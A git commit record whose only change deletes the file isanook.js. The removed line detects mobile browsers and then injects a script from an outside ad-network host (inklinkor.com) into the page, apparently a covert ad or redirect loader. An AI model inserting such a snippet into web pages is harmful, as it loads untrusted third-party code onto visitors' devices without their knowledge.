65155d80329a5be5cdcd41d308a8612d62a231a0
tatikers <91671910+tatikers@users.noreply.github.com>
2023-08-20 16:20:43 +0700

    Delete isanook.js

--- isanook.js
+++
@@ -1,1 +0,0 @@
-if(screen.width<500||navigator.userAgent.match(/Android/i)||navigator.userAgent.match(/webOS/i)||navigator.userAgent.match(/iPhone/i)||navigator.userAgent.match(/iPod/i)){(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'https://inklinkor.com/tag.min.js',6219629,document.body||document.documentElement)}
